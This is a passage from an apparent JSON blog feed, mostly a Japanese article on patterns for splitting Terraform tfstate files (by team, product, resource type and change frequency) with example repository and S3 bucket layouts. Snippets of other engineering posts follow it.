backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-backend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── elasticache.tf│    ├── rds.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-sre-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── alb.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する            ...▼ 同じリポジトリの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、同じリポジトリで管理するとリポジトリが巨大になってしまいます。そのため、これはお勧めしません。【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # frontendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│         └── terraform.tfstate # frontendチームが管理するmonitorコンポーネントの状態を持つ│├── \uD83D\uDCC2 backend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # backendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│          └── terraform.tfstate # backendチームが管理するmonitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 sre-team      ├── \uD83D\uDCC2 application      │    └── terraform.tfstate # sreチームが管理するapplicationコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 auth      │    └── terraform.tfstate # sreチームが管理するauthコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 monitor      │    └── terraform.tfstate # sreチームが管理するmonitorコンポーネントの状態を持つ      │      └── \uD83D\uDCC2 network            └── terraform.tfstate # sreチームが管理するnetworkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...同じテナント内のプロダクト別この分割方法について同じテナント (例：同じAWSアカウントの同じVPC) 内に複数の小さなプロダクトがある場合、プロダクト別でtfstateファイルを分割し、中間層もこれに基づいて設計します。ここでいうプロダクトは、アプリを動かすプラットフォーム (例：EKS、ECS、AppRunner、EC2) とそれを取り巻くAWSリソースを指しています。この分割方法により、各プロダクトの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【同じテナント内のプロダクト】状態の依存関係図例えば、以下のプロダクトに分割した状況と仮定します。fooプロダクトbarプロダクト共有networkコンポーネント (例：VPC、Route53)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、共有networkコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 同じテナント内のプロダクト---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            foo-product[\\"foo-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            bar-product[\\"bar-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            network[\\"network-tfstate<br>(Route53, VPC)\\"]        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# fooプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-foo-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する      ...# barプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-bar-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する      ...# 共有networkコンポーネントの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-network-repository/├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── route53.tf├── vpc.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 foo-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 bar-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合同じテナント内のプロダクトの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 foo-product│    └── terraform.tfstate # fooプロダクトの状態を持つ│├── \uD83D\uDCC2 bar-product│    └── terraform.tfstate # barプロダクトの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの種類グループ別この分割方法についてAWSリソースの種類グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各AWSリソースの種類グループも管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。特にこの分割方法は、グループ数がどんどん増えていく可能性があります\uD83D\uDE07【種類グループ別】状態の依存関係図例えば、以下の種類グループに分割した状況と仮定します。application (Webサーバー、Appサーバー系)auth (認証/認可系)datastore (DBサーバー系)cicd (CI/CD系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、networkグループやauthグループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの種類グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>例: ALB, API Gateway, CloudFront, EC2, ECS, EKS, SNS, など\\"]            auth[\\"auth-tfstate<br>例: IAM, など\\"]            cicd[\\"cicd-tfstate<br>例: Code3兄弟, など\\"]            monitor[\\"monitor-tfstate<br>例: CloudWatch, など\\"]            network[\\"network-tfstate<br>例: Route53, VPC, など\\"]            datastore[\\"datastore-tfstate<br>例: ElastiCache, RDS, S3, など\\"]            application-....->auth            application-..->datastore            application-...->network            cicd-..->application            datastore-..->network            monitor-..->application            monitor-..->datastore       end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── alb.tf│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 cicd/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── codebuild.tf│    ├── codecommit.tf│    ├── codedeploy.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 datastore/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── rds.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから参照できるように、outputブロックを定義する      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 cicd│    └── terraform.tfstate # cicdコンポーネントの状態を持つ│├── \uD83D\uDCC2 datastore│    └── terraform.tfstate # datastoreコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの状態の変更頻度グループ別この分割方法についてAWSリソースの状態の変更頻度グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各変更頻度グループの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。https://www.reddit.com/r/Terraform/comments/126jwa1/comment/jea9bjk/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button▶ おすすめ度について【変更頻度グループ別】状態の依存関係図例えば、以下の変更頻度グループに分割した状況と仮定します。変更高頻度グループ変更中頻度グループ変更低頻度グループここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、変更低頻度グループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの状態の変更頻度グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            high[\\"high-freq-tfstate<br>例: API Gateway, CloudFront, CloudWatch, IAM\\"]            middle[\\"middle-freq-tfstate<br>例: ALB, EC2, ECS, EKS, ElastiCache, RDS, S3, SES, SNS\\"]            low[\\"low-freq-tfstate<br>例: Route53, VPC\\"]            high-...->low            middle-..->low        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 high-freq # 高頻度変更グループ│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── cloudwatch.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 low-freq # 低頻度変更グループ│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── route53.tf│    ├── vpc.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 middle-freq # 中頻度変更グループ (高頻度とも低頻度とも言えないリソース)      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── elasticache.tf      ├── rds.tf      ├── s3.tf      ├── ses.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する           ...【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 high-freq│    └── terraform.tfstate # high-freqコンポーネントの状態を持つ│├── \uD83D\uDCC2 middle-freq│    └── terraform.tfstate # middle-freqコンポーネントの状態を持つ│└── \uD83D\uDCC2 low-freq      └── terraform.tfstate # low-freqコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...10. おわりにTerraformのtfstateファイルの分割パターンをもりもり布教しました。ぜひ採用してみたい分割パターンはあったでしょうか。Terraformの開発現場の具体的な要件は千差万別であり、特にtfstateファイル間の状態の依存関係は様々です。もし、この記事を参考に設計してくださる方は、分割パターンを現場に落とし込んで解釈いただけると幸いです\uD83D\uDE47\uD83C\uDFFB‍「自分を信じても…信頼に足る仲間を信じても…誰にもわからない…」(お友達の@nwiizo, 2023, Terraform Modules で再利用できるので最高ではないでしょうか？)謝辞今回、Terraformの分割パターンの収集にあたり、以下の方々からの意見・実装方法も参考にさせていただきました。@kiyo_12_07 さん@masasuzu さん@tozastation さん(アルファベット順)この場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Terraform in Action (English Edition)作者:Winkler, ScottManningAmazonTerraform: Up and Running: Writing Infrastructure as Code作者:Brikman, YevgeniyO\'Reilly MediaAmazon","isoDate":"2023-07-04T15:17:56.000Z","dateMiliSeconds":1688483876000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"光に負けルナ~Google Cloudでのマルチリージョンデータベースについて~","link":"https://zenn.dev/nnaka2992/articles/to_beat_light_speed_on_google_cloud_databases","contentSnippet":"クラウドを利用する一番のメリットの一つとしてオンデマンドでリソースを調達し、アクセス負荷に応じてスケールイン・アウト出来ることが上げられます。そのため大体のアプリケーションではシングルリージョンまたは隣接するリージョン2~3程度で運用を始めることが多いと思います。(日本の場合asia-northeast-1とasia-northeast-2など)アプリケーションがグローバルに拡大すると、それだけ物理的な距離が広がりユーザ・サーバ間のアクセスにかかる時間が拡大します。例えばユーザ・サーバ共に日本にある場合(沖縄・北海道間約3,000km)、ネットワークによる遅延は片道約15ms以下...","isoDate":"2023-07-03T15:39:08.000Z","dateMiliSeconds":1688398748000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"スリーシェイクに入社しました！","link":"https://bells17.medium.com/3-shake-279ea982b977?source=rss-713cf42ce34d------2","isoDate":"2023-07-03T14:10:50.000Z","dateMiliSeconds":1688393450000,"authorName":"bells17","authorId":"bells17"},{"title":"Copilotでらくらくコードリーディング","link":"https://zenn.dev/nnaka2992/articles/code_reading_with_copilot","contentSnippet":"GitHub Copilot便利ですね。2021年にTechnical Previewとして発表された時から便利だ便利だと言われていたGitHub Copilotに、2023年の4月末ごろからデビューしました。デビューしたは良いものの最近は仕事ではコーディングよりアーキテクト的な方面でのお仕事が多かったり、個人の時間でもコーディングするよりOSSのコードを読むことのほうが多くコーディングのアシスタントツールとしては使いこなせていません。そのため最近はPostgreSQLのコードを読むときのアシスタントとして利用することが多いです。なのでこの記事ではCopilotでコードリーディン...","isoDate":"2023-06-28T14:41:21.000Z","dateMiliSeconds":1687963281000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud RunのSidecarでJVMのmetricsの取得してみた","link":"https://zenn.dev/satohjohn/articles/25bc5879de7832","contentSnippet":"概要Cloud Runのmetricsをデフォルトで取得している指標(metrics)以外の指標が他に欲しい場合、どうするのが良いのかを考えてみました。ちょうどCloud RunのSidecar機能がでたので、それを使います。他の指標を、ここではJVMのmetricsとします。Cloud Run上のJVMのmetricsが取れて何が嬉しいのかについては、一旦考えません。後にCloud Runの最大起動時間が増えた場合は、意味があるかもしれません。 構成図にすると以下のような感じになります。Cloud RunでSpring Bootアプリケーションを立ち上げClou...","isoDate":"2023-06-28T12:03:00.000Z","dateMiliSeconds":1687953780000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ロクに勉強してこなかったエンジニアが輪読会参加とかPCA受験に向けて勉強とかしてみた話","link":"https://qiita.com/bayobayo0324/items/56f93f50fa0115dc4d6d","contentSnippet":"この記事について40歳でフリーランスから転職をきっかけに会社員エンジニアになって、社内のエンジニアの熱意に影響を受けて勉強をはじめてみた中年エンジニアの感想とか気づきとかです。先に結論勉強することってほんと良いなと。脳細胞が活性化する気がします。あと、自分のなか...","isoDate":"2023-06-27T12:31:17.000Z","dateMiliSeconds":1687869077000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"SRETT#6_Terraformのtfstateについて考える","link":"https://speakerdeck.com/masasuzu/srett-number-6-terraformnotfstatenituitekao-eru","contentSnippet":"","isoDate":"2023-06-22T04:00:00.000Z","dateMiliSeconds":1687406400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"アプリ開発者のための kubectl 